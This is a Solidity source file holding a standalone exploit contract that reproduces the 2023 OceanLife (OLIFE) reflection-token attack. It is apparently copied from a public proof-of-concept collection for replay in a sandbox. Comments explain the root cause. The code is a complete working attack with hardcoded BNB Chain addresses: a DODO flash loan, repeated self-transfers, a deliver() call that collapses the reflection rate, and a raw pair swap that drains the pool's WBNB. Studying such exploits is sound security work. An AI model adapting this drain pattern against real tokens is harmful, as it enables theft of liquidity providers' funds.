// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-04-OLIFE).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness (attacker = address(this)) — the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself, so there is no standalone
// contract to deploy. This file is a faithful, self-contained copy of that
// inline attack (testExploit body + DPPFlashLoanCall callback + minimal
// inline interfaces — no imports so it compiles anywhere), compiled inside
// the registry forge project. Logic and constants are copied verbatim from
// test/OLIFE_exp.sol.
//
// Root cause: OceanLife (OLIFE) is an RFI-style reflection token whose
// balanceOf() for non-excluded holders is DERIVED as _rOwned[account] /
// currentRate, where currentRate = rSupply / tSupply is a GLOBAL value. The
// OLIFE/WBNB pair is a non-excluded holder, so its reported balance tracks
// currentRate even though no tokens ever move into it. The permissionless
// deliver() function lets any caller burn its own rAmount straight out of
// the global _rTotal (shrinking rSupply, and thus currentRate) with no
// access control and no floor. Repeated self-transfers (loopTransfer) first
// shrink both ledgers via the per-transfer burn/reflect fees, then a single
// large deliver() collapses currentRate so far that the pair's derived OLIFE
// balance inflates by ~3.9e13x with no OLIFE ever deposited. The attacker
// then sells that phantom OLIFE straight into the pair via a raw swap(),
// computing the WBNB payout with the standard constant-product formula
// against the (unchanged) real getReserves() — draining nearly the entire
// WBNB side of the pool.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IOceanLife {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function deliver(uint256 tAmount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract OceanDrain {
    uint256 internal constant FLASHLOAN_WBNB_AMOUNT = 969 * 1e18;

    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IOceanLife constant OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);
    IPancakeRouter constant pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair constant OLIFE_WBNB_LPPool = IPancakePair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);

    address constant DODO = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;

    // step 1: flash-borrow 969 WBNB from the DODO DVM pool. The callback below
    // does the entire attack; the flash loan is repaid before it returns.
    function run() external {
        IDVM(DODO).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));
    }

    function loopTransfer(uint256 num) internal {
        uint256 i;
        while (i < num) {
            uint256 amount = OLIFE.balanceOf(address(this));
            OLIFE.transfer(address(this), amount);
            i++;
        }
    }

    // DODO V2 flash-loan callback (base-side loan, since quoteAmount=0). The
    // attacker buys OLIFE, then collapses currentRate via self-transfers +
    // deliver(), inflating the pair's derived OLIFE balance, then sells that
    // phantom OLIFE straight into the pair for the pool's WBNB.
    function DPPFlashLoanCall(
        address, // sender
        uint256, // baseAmount
        uint256, // quoteAmount
        bytes calldata // data
    ) external {
        WBNB.approve(address(pancakeRouter), type(uint256).max);

        address[] memory swapPath = new address[](2);
        swapPath[0] = address(WBNB);
        swapPath[1] = address(OLIFE);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASHLOAN_WBNB_AMOUNT, 0, swapPath, address(this), block.timestamp
        );

        // Reflection calculations:
        //   currentRate = rSupply / tSupply (excluded users are not counted)
        //   balanceOf(pair) = _rOwned[pair] / currentRate
        loopTransfer(19);

        OLIFE.deliver(66_859_267_695_870_000);

        (uint256 oldOlifeReserve, uint256 bnbReserve,) = OLIFE_WBNB_LPPool.getReserves();
        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));
        uint256 amountin = newolifeReserve - oldOlifeReserve;
        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10_000 + amountin * 9975);

        // swap the phantom OLIFE balance for WBNB
        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), "");

        // repay the flash loan
        WBNB.transfer(address(DODO), FLASHLOAN_WBNB_AMOUNT);
    }
}
